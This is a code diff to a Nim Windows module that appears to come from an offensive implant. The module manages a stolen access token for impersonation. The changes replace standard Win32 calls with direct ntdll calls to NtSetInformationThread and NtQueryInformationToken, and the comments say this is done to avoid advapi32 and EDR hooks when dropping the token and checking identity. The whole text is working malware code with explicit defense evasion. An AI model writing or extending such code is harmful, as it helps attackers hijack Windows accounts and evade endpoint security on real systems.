@@ -1101,7 +1101,13 @@ when defined(windows):
     return "[+] impersonating " & domain & "\\" & user
 
   proc doTokenDrop(): string =
-    discard RevertToSelf()
+    # NtSetInformationThread(ThreadImpersonationToken=5, NULL) — avoids advapi32 hook
+    type NtSITFn = proc(h: HANDLE, cls: ULONG, info: pointer, len: ULONG): LONG {.stdcall.}
+    let ntdll = GetModuleHandleA("ntdll.dll")
+    let NtSIT = cast[NtSITFn](GetProcAddress(ntdll, "NtSetInformationThread"))
+    var hNull: HANDLE = 0
+    if NtSIT != nil: discard NtSIT(GetCurrentThread(), 5, addr hNull, ULONG(sizeof(hNull)))
+    else: discard RevertToSelf()
     acquire(gTokenLock)
     let old = gStolenToken
     gStolenToken = 0
@@ -1110,6 +1116,29 @@ when defined(windows):
     return "[+] reverted to original token"
 
   proc doTokenWhoami(): string =
+    # NT path: OpenThreadToken → NtQueryInformationToken → LookupAccountSidW
+    # Avoids GetUserNameA/W which are commonly hooked by EDRs.
+    type NtQITFn = proc(h: HANDLE, cls: ULONG, info: pointer, len: ULONG, ret: ptr ULONG): LONG {.stdcall.}
+    let ntdll = GetModuleHandleA("ntdll.dll")
+    let NtQIT = cast[NtQITFn](GetProcAddress(ntdll, "NtQueryInformationToken"))
+    var hTok: HANDLE = 0
+    let openedThread = OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, 1, addr hTok) != 0
+    if not openedThread: discard OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, addr hTok)
+    if hTok != 0 and NtQIT != nil:
+      defer: discard CloseHandle(hTok)
+      var needed: ULONG = 0
+      discard NtQIT(hTok, 1, nil, 0, addr needed)
+      if needed > 0:
+        var tbuf = newSeq[byte](int(needed))
+        if NtQIT(hTok, 1, addr tbuf[0], needed, addr needed) == 0:
+          let tu = cast[ptr TOKEN_USER](addr tbuf[0])
+          var nameBuf: array[256, WCHAR]; var domBuf: array[256, WCHAR]
+          var nameLen = DWORD(256); var domLen = DWORD(256); var sidType: SID_NAME_USE
+          if LookupAccountSidW(nil, tu.User.Sid, addr nameBuf[0], addr nameLen,
+              addr domBuf[0], addr domLen, addr sidType) != 0:
+            return $cast[WideCString](addr domBuf[0]) & "\\" & $cast[WideCString](addr nameBuf[0])
+    if hTok != 0: discard CloseHandle(hTok)
+    # Fallback
     var buf: array[512, WCHAR]; var sz = DWORD(buf.len)
     if GetUserNameW(addr buf[0], addr sz) == 0: return "GetUserNameW failed"
     return $cast[WideCString](addr buf[0])
